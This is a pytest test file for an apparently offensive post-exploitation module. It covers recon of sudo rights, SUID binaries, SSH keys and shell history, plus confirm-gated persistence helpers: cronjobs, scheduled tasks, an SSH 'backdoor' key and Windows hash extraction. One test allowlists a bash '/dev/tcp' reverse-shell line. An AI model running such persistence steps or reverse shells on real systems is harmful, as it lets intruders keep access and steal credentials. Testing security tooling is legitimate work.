from __future__ import annotations

import hwatlib.postex as postex


def _force_unix(monkeypatch):
    monkeypatch.setattr(postex, "is_windows", lambda: False)
    monkeypatch.setattr(postex, "is_linux", lambda: True)


def test_pretty_report_serializes_dict():
    out = postex.pretty_report({"a": 1, "b": [1, 2]})
    assert '"a": 1' in out


def test_pretty_report_falls_back_on_unserializable():
    class Weird:
        def __repr__(self):
            return "WEIRD"

    # default=str makes json handle most things; force the except path with a
    # dict that raises during serialization.
    class Bomb(dict):
        def items(self):
            raise RuntimeError("boom")

    out = postex.pretty_report(Bomb())
    assert isinstance(out, str)


def test_is_windows_is_linux(monkeypatch):
    monkeypatch.setattr(postex.platform, "system", lambda: "Linux")
    assert postex.is_linux() is True
    assert postex.is_windows() is False
    monkeypatch.setattr(postex.platform, "system", lambda: "Windows")
    assert postex.is_windows() is True


def test_run_cmd_empty_returns_empty():
    assert postex.run_cmd([]) == ""


def test_run_cmd_uses_run_argv(monkeypatch):
    monkeypatch.setattr(postex, "_run_argv", lambda argv, **k: (0, "OUT:" + " ".join(argv)))
    assert postex.run_cmd("echo hi") == "OUT:echo hi"


def test_get_system_info_unix(monkeypatch):
    _force_unix(monkeypatch)
    monkeypatch.setattr(postex, "run_cmd", lambda *a, **k: "kernel-info")
    info = postex.get_system_info()
    assert info["kernel"] == "kernel-info"
    assert "os" in info and "whoami" in info


def test_check_sudo_rights_unix(monkeypatch):
    _force_unix(monkeypatch)
    monkeypatch.setattr(postex, "run_cmd", lambda argv, **k: "sudo output")
    assert postex.check_sudo_rights() == "sudo output"


def test_windows_only_functions_return_marker_on_unix(monkeypatch):
    _force_unix(monkeypatch)
    assert postex.list_services_windows() == "Windows-only"
    assert postex.enum_installed_programs_windows() == "Windows-only"
    assert postex.enum_weak_services_windows() == "Windows-only"
    assert postex.find_common_windows_credentials() == "Windows-only"


def test_find_suid_bins_unix(monkeypatch):
    _force_unix(monkeypatch)
    monkeypatch.setattr(postex, "run_cmd", lambda argv, **k: "/usr/bin/sudo")
    assert postex.find_suid_bins() == "/usr/bin/sudo"


def test_full_recon_unix_shape(monkeypatch):
    _force_unix(monkeypatch)
    monkeypatch.setattr(postex, "run_cmd", lambda *a, **k: "x")
    monkeypatch.setattr(postex, "search_history", lambda: "hist")
    monkeypatch.setattr(postex, "search_ssh_keys", lambda: "keys")
    monkeypatch.setattr(postex, "search_config_files", lambda: "conf")
    monkeypatch.setattr(postex, "find_network_shares", lambda: "shares")
    report = postex.full_recon()
    assert set(["system_info", "sudo_rights", "suid_bins", "kernel_version", "ssh_keys", "bash_history"]) <= set(report)
    # Windows-only sections absent on unix.
    assert "services" not in report


# --- state-changing helpers: refusal without confirm ---

def test_add_cronjob_confirmed_refuses_without_confirm():
    assert postex.add_cronjob_confirmed("bash -i", confirm=False).startswith("[-]")


def test_add_schtask_confirmed_refuses_without_confirm():
    assert postex.add_schtask_confirmed("bash -i", confirm=False).startswith("[-]")


def test_backdoor_ssh_confirmed_refuses_without_confirm():
    assert postex.backdoor_ssh_confirmed("ssh-ed25519 AAAA", confirm=False).startswith("[-]")


def test_extract_hashes_refuses_without_confirm():
    assert postex.extract_hashes_windows_confirmed(confirm=False).startswith("[-]")


def test_extract_hashes_windows_only(monkeypatch):
    _force_unix(monkeypatch)
    assert postex.extract_hashes_windows_confirmed(confirm=True) == "Windows-only function."


def test_backdoor_ssh_confirmed_writes_key(monkeypatch, tmp_path):
    _force_unix(monkeypatch)
    home = tmp_path / "home"
    monkeypatch.setattr(postex.os.path, "expanduser", lambda p: str(home / ".ssh"))
    msg = postex.backdoor_ssh_confirmed("ssh-ed25519 AAAAKEY", confirm=True)
    assert msg.startswith("[+]")
    auth = home / ".ssh" / "authorized_keys"
    assert "ssh-ed25519 AAAAKEY" in auth.read_text()


def test_add_cronjob_confirmed_rejects_bad_command():
    # 'rm' is not in the allowlist.
    assert "allowlist" in postex.add_cronjob_confirmed("rm -rf /", confirm=True)


def test_add_cronjob_confirmed_success(monkeypatch):
    calls = []

    def fake_run_argv(argv, *, input_text=None):
        calls.append((tuple(argv), input_text))
        if argv[:2] == ["crontab", "-l"]:
            return 0, "# existing"
        return 0, ""

    monkeypatch.setattr(postex, "_run_argv", fake_run_argv)
    out = postex.add_cronjob_confirmed("bash -i", schedule="*/5 * * * *", confirm=True)
    assert out == "[+] Cronjob added."
    # The new crontab was piped to `crontab -`.
    assert any(a[0] == ("crontab", "-") for a in calls)


def test_run_fallback_prefers_first_success(monkeypatch):
    def fake_run_argv(argv, **k):
        if argv[0] == "a":
            return 1, ""
        return 0, "second"

    monkeypatch.setattr(postex, "_run_argv", fake_run_argv)
    assert postex._run_fallback((["a"], ["b"])) == "second"


def test_is_allowed_state_change_command():
    assert postex._is_allowed_state_change_command("bash -i >& /dev/tcp/1/2 0>&1") is True
    assert postex._is_allowed_state_change_command("/usr/bin/python3 -c 'x'") is True
    assert postex._is_allowed_state_change_command("rm -rf /") is False
    assert postex._is_allowed_state_change_command("") is False
